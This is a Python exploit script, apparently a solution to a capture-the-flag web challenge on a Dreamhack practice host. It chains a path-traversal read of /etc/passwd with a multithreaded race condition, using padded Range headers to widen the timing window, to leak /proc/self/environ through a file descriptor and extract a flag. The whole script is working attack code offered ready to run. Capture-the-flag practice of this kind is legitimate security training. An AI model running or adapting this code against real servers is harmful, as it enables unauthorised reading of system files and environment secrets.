import re
import threading
import requests

url = 'http://host3.dreamhack.games:11157'
s = requests.Session()

# was supposed to be some test code but script breaks without it lol
def leak(path):
    parts = [p for p in path.split('/') if p != '']

    res = s.get(f"{url.rstrip('/')}/query/view/..{'.'.join(parts)}")

    if res.status_code == 200:
        return res.text

    return f'Error: {res.text}'

# dont remove this, fixes environ fd onto 19 for some reason
print(leak('/etc/passwd'))

def init_jsonfs():
    sess = requests.Session()
    
    res = sess.post(f'{url}/update/reset')
    assert res.json()['success']

    res = sess.post(f'{url}/update/patch', json=[""] * 7000)
    assert res.json()['success']

    # race cond swaps /proc/self/environ with this dummy file
    sess.post(
        f'{url}/update/patch',
        json={'self': {'environ': 'A' * 1251}},
    )

NUM_SPRAY_THREADS = 8
NUM_READER_THREADS = 4
ROUNDS_PER_THREAD = 0x400

env_leak = None
stop_event = threading.Event()

def spray_worker():
    sess = requests.Session()
    spray_url = f"{url.rstrip('/')}/query/list/.,..proc"
    while not stop_event.is_set():
        try:
            sess.get(spray_url)
        except requests.RequestException:
            pass

def reader_worker(fd):
    global env_leak
    sess = requests.Session()
    read_url = f"{url.rstrip('/')}/query/view/..proc.self.fd.{fd}.self.environ"

    # add junk headers to slow down res.send()
    range_hdr = 'bytes=0-10000,' + ','.join(['9-0', '0-1', '1-9', 'a-a'] * 60)
    headers = {'Range': range_hdr, 'if-range': '"'}

    for _ in range(ROUNDS_PER_THREAD):
        if stop_event.is_set():
            return
        try:
            res = sess.get(read_url, headers=headers)
            print("Leak:", res.text)
        except Exception as e:
            print("Error:", e)
            continue

        if 'flag' in res.text.lower():
            env_leak = res.text
            
            stop_event.set()
            return

def race_environ(fd_candidates):
    stop_event.clear()

    threads = []
    for _ in range(NUM_SPRAY_THREADS):
        t = threading.Thread(target=spray_worker, daemon=True)
        threads.append(t)

    for fd in fd_candidates:
        for _ in range(NUM_READER_THREADS):
            t = threading.Thread(target=reader_worker, args=(fd,), daemon=True)
            threads.append(t)

    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=60)

    stop_event.set()

print('> Filling /tmp/jsonfs with junk')
init_jsonfs()

print('> Racing /proc/self/environ')
race_environ(fd_candidates=(19,))

flag = re.findall(r'(GoN{.+?})', env_leak)[0].strip()
print("Flag:", flag)